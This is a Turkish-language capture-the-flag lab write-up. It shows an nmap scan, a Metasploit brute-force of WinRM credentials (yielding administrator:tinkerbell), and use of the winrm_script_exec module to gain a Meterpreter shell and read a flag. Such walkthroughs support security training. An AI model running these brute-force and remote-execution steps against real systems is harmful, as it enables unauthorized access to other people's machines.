# 🛡️ INE CTF: WinRM Exploitation with Metasploit

Bu CTF senaryosunda, `demo.ine.local` hedef sisteminde **WinRM (Windows Remote Management)** servisi kullanılarak **Meterpreter shell** elde edilmiştir. Tüm işlemler Metasploit Framework üzerinden gerçekleştirilmiştir.

---

## 🌐 Hedef Sistem: demo.ine.local

---

## 🔎 1. Port Keşfi (Nmap)

İlk adımda sistemin hangi portlarının açık olduğunu tespit etmek amacıyla en çok kullanılan 7000 port tarandı:

nmap --top-ports 7000 demo.ine.local

PORT     STATE SERVICE
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
445/tcp  open  microsoft-ds
3389/tcp open  ms-wbt-server
5985/tcp open  wsman

🔥 Port 5985/tcp WinRM (WSMAN) servisine ait ve açık durumda.
🔐 2. Brute-Force ile Giriş Bilgilerini Elde Etme
Metasploit Framework üzerinden winrm_login modülü kullanılarak kullanıcı adı ve parola denemesi yapıldı:
msfconsole -q

use auxiliary/scanner/winrm/winrm_login
set RHOSTS demo.ine.local
set USER_FILE /usr/share/metasploit-framework/data/wordlists/common_users.txt
set PASS_FILE /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt
set VERBOSE false
set PASSWORD anything
exploit
[+] 10.2.16.113:5985 - Login Successful: WORKSTATION\administrator:tinkerbell
✅ administrator : tinkerbell kullanıcı bilgileri ile WinRM erişimi sağlandı.

3. Desteklenen Kimlik Doğrulama Yöntemlerini Test Etme
Hedef sistemin desteklediği kimlik doğrulama türlerini görmek için ek modül kullanıldı:

use auxiliary/scanner/winrm/winrm_auth_methods
set RHOSTS demo.ine.local
exploit
Sonuç:
Desteklenen yöntemler: Basic ve Negotiate

WinRM Script Exec ile Meterpreter Kabuk Elde Etme
WinRM üzerinden sistemde komut çalıştırmak için winrm_script_exec exploit modülü kullanıldı:

use exploit/windows/winrm/winrm_script_exec
set RHOSTS demo.ine.local
set USERNAME administrator
set PASSWORD tinkerbell
set FORCE_VBS true
exploit
✅ Başarılı exploit sonrası Meterpreter kabuğu elde edildi.

📂 5. Bayrağı Ele Geçirme
Meterpreter shell üzerinde çalıştırılan komutlarla flag.txt dosyası bulundu ve okundu:

cd /
dir
cat flag.txt
🏴 Bayrak başarıyla ele geçirildi.



